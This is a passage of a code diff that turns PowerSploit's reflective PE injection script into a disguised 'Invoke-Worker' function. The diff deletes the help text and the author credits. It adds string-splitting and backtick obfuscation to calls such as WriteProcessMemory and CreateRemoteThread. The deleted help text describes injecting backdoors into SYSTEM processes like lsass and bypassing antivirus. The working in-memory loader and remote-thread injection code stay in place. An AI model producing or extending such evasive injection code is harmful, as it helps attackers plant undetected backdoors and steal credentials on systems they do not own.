@@ -1,185 +1,5 @@
 function Invoke-Worker {
-	<#
-.SYNOPSIS
 
-This script has two modes. It can reflectively load a DLL/EXE in to the PowerShell process, 
-or it can reflectively load a DLL in to a remote process. These modes have different parameters and constraints, 
-please lead the Notes section (GENERAL NOTES) for information on how to use them.
-
-
-1.)Reflectively loads a DLL or EXE in to memory of the Powershell process.
-Because the DLL/EXE is loaded reflectively, it is not displayed when tools are used to list the DLLs of a running process.
-
-This tool can be run on remote servers by supplying a local Windows PE file (DLL/EXE) to load in to memory on the remote system,
-this will load and execute the DLL/EXE in to memory without writing any files to disk.
-
-
-2.) Reflectively load a DLL in to memory of a remote process.
-As mentioned above, the DLL being reflectively loaded won't be displayed when tools are used to list DLLs of the running remote process.
-
-This is probably most useful for injecting backdoors in SYSTEM processes in Session0. Currently, you cannot retrieve output
-from the DLL. The script doesn't wait for the DLL to complete execution, and doesn't make any effort to cleanup memory in the 
-remote process. 
-
-
-While this script provides functionality to specify a file to load from disk a URL, or a byte array, these are more for demo purposes. The way I'd recommend using the script is to create a byte array
-containing the file you'd like to reflectively load, and hardcode that byte array in to the script. One advantage of doing this is you can encrypt the byte array and decrypt it in memory, which will
-bypass A/V. Another advantage is you won't be making web requests. The script can also load files from SQL Server and be used as a SQL Server backdoor. Please see the Casaba
-blog linked below (thanks to whitey).
-
-PowerSploit Function: Invoke-ReflectivePEInjection
-Author: Joe Bialek, Twitter: @JosephBialek
-License: BSD 3-Clause
-Required Dependencies: None
-Optional Dependencies: None
-Version: 1.4
-
-.DESCRIPTION
-
-Reflectively loads a Windows PE file (DLL/EXE) in to the powershell process, or reflectively injects a DLL in to a remote process.
-
-.PARAMETER PEPath
-
-The path of the DLL/EXE to load and execute. This file must exist on the computer the script is being run on, not the remote computer.
-
-.PARAMETER PEUrl
-
-A URL containing a DLL/EXE to load and execute.
-
-.PARAMETER PEBytes
-
-A byte array containing a DLL/EXE to load and execute.
-
-.PARAMETER ComputerName
-
-Optional, an array of computernames to run the script on.
-
-.PARAMETER FuncReturnType
-
-Optional, the return type of the function being called in the DLL. Default: Void
-	Options: String, WString, Void. See notes for more information.
-	IMPORTANT: For DLLs being loaded remotely, only Void is supported.
-	
-.PARAMETER ExeArgs
-
-Optional, arguments to pass to the executable being reflectively loaded.
-	
-.PARAMETER ProcName
-
-Optional, the name of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.
-
-.PARAMETER ProcId
-
-Optional, the process ID of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.
-
-.PARAMETER ForceASLR
-
-Optional, will force the use of ASLR on the PE being loaded even if the PE indicates it doesn't support ASLR. Some PE's will work with ASLR even
-    if the compiler flags don't indicate they support it. Other PE's will simply crash. Make sure to test this prior to using. Has no effect when
-    loading in to a remote process.
-	
-.EXAMPLE
-
-Load DemoDLL from a URL and run the exported function WStringFunc on the current system, print the wchar_t* returned by WStringFunc().
-Note that the file name on the website can be any file extension.
-Invoke-ReflectivePEInjection -PEUrl http://yoursite.com/DemoDLL.dll -FuncReturnType WString
-
-.EXAMPLE
-
-Load DemoDLL and run the exported function WStringFunc on Target.local, print the wchar_t* returned by WStringFunc().
-Invoke-ReflectivePEInjection -PEPath DemoDLL.dll -FuncReturnType WString -ComputerName Target.local
-
-.EXAMPLE
-
-Load DemoDLL and run the exported function WStringFunc on all computers in the file targetlist.txt. Print
-	the wchar_t* returned by WStringFunc() from all the computers.
-Invoke-ReflectivePEInjection -PEPath DemoDLL.dll -FuncReturnType WString -ComputerName (Get-Content targetlist.txt)
-
-.EXAMPLE
-
-Load DemoEXE and run it locally.
-Invoke-ReflectivePEInjection -PEPath DemoEXE.exe -ExeArgs "Arg1 Arg2 Arg3 Arg4"
-
-.EXAMPLE
-
-Load DemoEXE and run it locally. Forces ASLR on for the EXE.
-Invoke-ReflectivePEInjection -PEPath DemoEXE.exe -ExeArgs "Arg1 Arg2 Arg3 Arg4" -ForceASLR
-
-.EXAMPLE
-
-Refectively load DemoDLL_RemoteProcess.dll in to the lsass process on a remote computer.
-Invoke-ReflectivePEInjection -PEPath DemoDLL_RemoteProcess.dll -ProcName lsass -ComputerName Target.Local
-
-.EXAMPLE
-
-Load a PE from a byte array.
-Invoke-ReflectivePEInjection -PEPath (Get-Content c:\DemoEXE.exe -Encoding Byte) -ExeArgs "Arg1 Arg2 Arg3 Arg4"
-
-.NOTES
-GENERAL NOTES:
-The script has 3 basic sets of functionality:
-1.) Reflectively load a DLL in to the PowerShell process
-	-Can return DLL output to user when run remotely or locally.
-	-Cleans up memory in the PS process once the DLL finishes executing.
-	-Great for running pentest tools on remote computers without triggering process monitoring alerts.
-	-By default, takes 3 function names, see below (DLL LOADING NOTES) for more info.
-2.) Reflectively load an EXE in to the PowerShell process.
-	-Can NOT return EXE output to user when run remotely. If remote output is needed, you must use a DLL. CAN return EXE output if run locally.
-	-Cleans up memory in the PS process once the DLL finishes executing.
-	-Great for running existing pentest tools which are EXE's without triggering process monitoring alerts.
-3.) Reflectively inject a DLL in to a remote process.
-	-Can NOT return DLL output to the user when run remotely OR locally.
-	-Does NOT clean up memory in the remote process if/when DLL finishes execution.
-	-Great for planting backdoor on a system by injecting backdoor DLL in to another processes memory.
-	-Expects the DLL to have this function: void VoidFunc(). This is the function that will be called after the DLL is loaded.
-
-
-
-DLL LOADING NOTES:
-
-PowerShell does not capture an applications output if it is output using stdout, which is how Windows console apps output.
-If you need to get back the output from the PE file you are loading on remote computers, you must compile the PE file as a DLL, and have the DLL
-return a char* or wchar_t*, which PowerShell can take and read the output from. Anything output from stdout which is run using powershell
-remoting will not be returned to you. If you just run the PowerShell script locally, you WILL be able to see the stdout output from
-applications because it will just appear in the console window. The limitation only applies when using PowerShell remoting.
-
-For DLL Loading:
-Once this script loads the DLL, it calls a function in the DLL. There is a section near the bottom labeled "YOUR CODE GOES HERE"
-I recommend your DLL take no parameters. I have prewritten code to handle functions which take no parameters are return
-the following types: char*, wchar_t*, and void. If the function returns char* or wchar_t* the script will output the
-returned data. The FuncReturnType parameter can be used to specify which return type to use. The mapping is as follows:
-wchar_t*   : FuncReturnType = WString
-char*      : FuncReturnType = String
-void       : Default, don't supply a FuncReturnType
-
-For the whcar_t* and char_t* options to work, you must allocate the string to the heap. Don't simply convert a string
-using string.c_str() because it will be allocaed on the stack and be destroyed when the DLL returns.
-
-The function name expected in the DLL for the prewritten FuncReturnType's is as follows:
-WString    : WStringFunc
-String     : StringFunc
-Void       : VoidFunc
-
-These function names ARE case sensitive. To create an exported DLL function for the wstring type, the function would
-be declared as follows:
-extern "C" __declspec( dllexport ) wchar_t* WStringFunc()
-
-
-If you want to use a DLL which returns a different data type, or which takes parameters, you will need to modify
-this script to accomodate this. You can find the code to modify in the section labeled "YOUR CODE GOES HERE".
-
-Find a DemoDLL at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectiveDllInjection
-
-.LINK
-
-Blog: http://clymb3r.wordpress.com/
-Github repo: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectivePEInjection
-
-Blog on reflective loading: http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/
-Blog on modifying mimikatz for reflective loading: http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
-Blog on using this script as a backdoor with SQL server: http://www.casaba.com/blog/
-
-#>
 
 	[CmdletBinding(DefaultParameterSetName = "WebFile")]
 	Param(
@@ -253,14 +73,14 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			$ForceASLR
 		)
 	
-		###################################
-		##########  Win32 Stuff  ##########
-		###################################
+		
+		
+		
 		Function Get-Win32Types {
 			$Win32Types = New-Object System.Object
 
-			#Define all the structures/enums that will be used
-			#	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
+			
+			
 			$Domain = [AppDomain]::CurrentDomain
 			$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
 			$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
@@ -268,8 +88,8 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
 
 
-			############    ENUM    ############
-			#Enum MachineType
+			
+			
 			$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
 			$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
 			$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
@@ -278,14 +98,14 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			$MachineType = $TypeBuilder.CreateType()
 			$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType
 
-			#Enum MagicType
+			
 			$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
 			$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
 			$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
 			$MagicType = $TypeBuilder.CreateType()
 			$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType
 
-			#Enum SubSystemType
+			
 			$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
 			$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
 			$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
@@ -301,7 +121,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			$SubSystemType = $TypeBuilder.CreateType()
 			$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType
 
-			#Enum DllCharacteristicsType
+			
 			$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
 			$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
 			$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
@@ -319,8 +139,8 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			$DllCharacteristicsType = $TypeBuilder.CreateType()
 			$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType
 
-			###########    STRUCT    ###########
-			#Struct IMAGE_DATA_DIRECTORY
+			
+			
 			$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
 			$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
 			($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
@@ -328,7 +148,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
 			$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY
 
-			#Struct IMAGE_FILE_HEADER
+			
 			$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
 			$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
 			$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
@@ -341,7 +161,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
 			$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER
 
-			#Struct IMAGE_OPTIONAL_HEADER64
+			
 			$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
 			$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
 			($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
@@ -392,7 +212,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
 			$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64
 
-			#Struct IMAGE_OPTIONAL_HEADER32
+			
 			$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
 			$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
 			($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
@@ -444,7 +264,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
 			$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32
 
-			#Struct IMAGE_NT_HEADERS64
+			
 			$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
 			$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
 			$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
@@ -453,7 +273,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
 			$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
 		
-			#Struct IMAGE_NT_HEADERS32
+			
 			$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
 			$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
 			$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
@@ -462,7 +282,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
 			$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32
 
-			#Struct IMAGE_DOS_HEADER
+			
 			$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
 			$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
 			$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
@@ -498,7 +318,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()	
 			$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER
 
-			#Struct IMAGE_SECTION_HEADER
+			
 			$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
 			$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)
 
@@ -519,7 +339,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
 			$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER
 
-			#Struct IMAGE_BASE_RELOCATION
+			
 			$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
 			$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
 			$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
@@ -527,7 +347,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
 			$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION
 
-			#Struct IMAGE_IMPORT_DESCRIPTOR
+			
 			$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
 			$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
 			$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
@@ -538,7 +358,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
 			$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR
 
-			#Struct IMAGE_EXPORT_DIRECTORY
+			
 			$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
 			$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
 			$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
@@ -555,7 +375,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
 			$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
 		
-			#Struct LUID
+			
 			$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
 			$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
 			$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
@@ -563,7 +383,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			$LUID = $TypeBuilder.CreateType()
 			$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
 		
-			#Struct LUID_AND_ATTRIBUTES
+			
 			$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
 			$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
 			$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
@@ -571,7 +391,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
 			$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
 		
-			#Struct TOKEN_PRIVILEGES
+			
 			$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
 			$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
 			$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
@@ -651,7 +471,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
 			$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
 		
-			$GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself
+			$GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress 
 			$GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
 			$GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
 			$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr
@@ -669,7 +489,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
 			$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
 			$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
-			$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
+			$Win32Functions |  Add-Member ("{0}{2}{1}" -f'Note','y','Propert') -Name ("{0}{2}{3}{1}"-f'Vir','Protect','t','ual') -Value ${V`IRtUa`L`P`RoTeCT}
 		
 			$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
 			$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
@@ -694,7 +514,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
 			$WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
 			$WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
-			$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
+			$Win32Functions | Add-Member -MemberType ("{0}{3}{2}{1}" -f 'N','Property','te','o') -Name ("{1}{0}{3}{2}"-f'Proces','Write','Memory','s') -Value ${W`RiTE`pr`OCeS`smeMORY}
 		
 			$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
 			$ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
@@ -753,15 +573,15 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 		
 			return $Win32Functions
 		}
-		#####################################
+		
 
 			
-		#####################################
-		###########    HELPERS   ############
-		#####################################
+		
+		
+		
 
-		#Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
-		#This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
+		
+		
 		Function Sub-SignedIntAsUnsigned {
 			Param(
 				[Parameter(Position = 0, Mandatory = $true)]
@@ -781,7 +601,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 				$CarryOver = 0
 				for ($i = 0; $i -lt $Value1Bytes.Count; $i++) {
 					$Val = $Value1Bytes[$i] - $CarryOver
-					#Sub bytes
+					
 					if ($Val -lt $Value2Bytes[$i]) {
 						$Val += 256
 						$CarryOver = 1
@@ -822,7 +642,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			if ($Value1Bytes.Count -eq $Value2Bytes.Count) {
 				$CarryOver = 0
 				for ($i = 0; $i -lt $Value1Bytes.Count; $i++) {
-					#Add bytes
+					
 					[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver
 
 					$FinalBytes[$i] = $Sum -band 0x00FF
@@ -890,11 +710,11 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 		Function Get-Hex {
 			Param(
 				[Parameter(Position = 0, Mandatory = $true)]
-				$Value #We will determine the type dynamically
+				$Value 
 			)
 
 			$ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
-			$Hex = "0x{0:X$($ValueSize)}" -f [Int64]$Value #Passing a IntPtr to this doesn't work well. Cast to Int64 first.
+			$Hex = "0x{0:X$($ValueSize)}" -f [Int64]$Value 
 
 			return $Hex
 		}
@@ -959,7 +779,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 		}
 	
 
-		#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
+		
 		Function Get-DelegateType {
 			Param
 			(
@@ -988,7 +808,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 		}
 
 
-		#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
+		
 		Function Get-ProcAddress {
 			Param
 			(
@@ -1003,19 +823,19 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 				$Procedure
 			)
 
-			# Get a reference to System.dll in the GAC
+			
 			$SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
 			Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
 			$UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
-			# Get a reference to the GetModuleHandle and GetProcAddress methods
+			
 			$GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
 			$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
-			# Get a handle to the module specified
+			
 			$Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
 			$tmpPtr = New-Object IntPtr
 			$HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
 
-			# Return the address of the function
+			
 			Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
 		}
 
@@ -1075,9 +895,9 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)
 
 			$Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
-			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
+			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() 
 			if (($Result -eq $false) -or ($ErrorCode -ne 0)) {
-				#Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
+				
 			}
 
 			[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
@@ -1106,19 +926,19 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
 
 			$OSVersion = [Environment]::OSVersion.Version
-			#Vista and Win7
+			
 			if (($OSVersion -ge (New-Object 'Version' 6, 0)) -and ($OSVersion -lt (New-Object 'Version' 6, 2))) {
-				#Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
+				
 				$RetVal = $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
 				$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
 				if ($RemoteThreadHandle -eq [IntPtr]::Zero) {
 					Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
 				}
 			}
-			#XP/Win8
+			
 			else {
-				#Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
-				$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
+				
+				$RemoteThreadHandle = $Win32Functions."CREater`eMO`TE`THre`AD"."i`N`VOkE"($ProcessHandle, [IntPtr]::"Z`ero", [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::"Z`eRO")
 			}
 
 			if ($RemoteThreadHandle -eq [IntPtr]::Zero) {
@@ -1143,15 +963,15 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 
 			$NtHeadersInfo = New-Object System.Object
 
-			#Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
+			
 			$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)
 
-			#Get IMAGE_NT_HEADERS
+			
 			[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
 			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
 			$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
 
-			#Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
+			
 			if ($imageNtHeaders64.Signature -ne 0x00004550) {
 				throw "Invalid IMAGE_NT_HEADER signature."
 			}
@@ -1170,7 +990,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 		}
 
 
-		#This function will get the information needed to allocated space in memory for the PE
+		
 		Function Get-PEBasicInfo {
 			Param(
 				[Parameter( Position = 0, Mandatory = $true )]
@@ -1184,29 +1004,29 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 
 			$PEInfo = New-Object System.Object
 
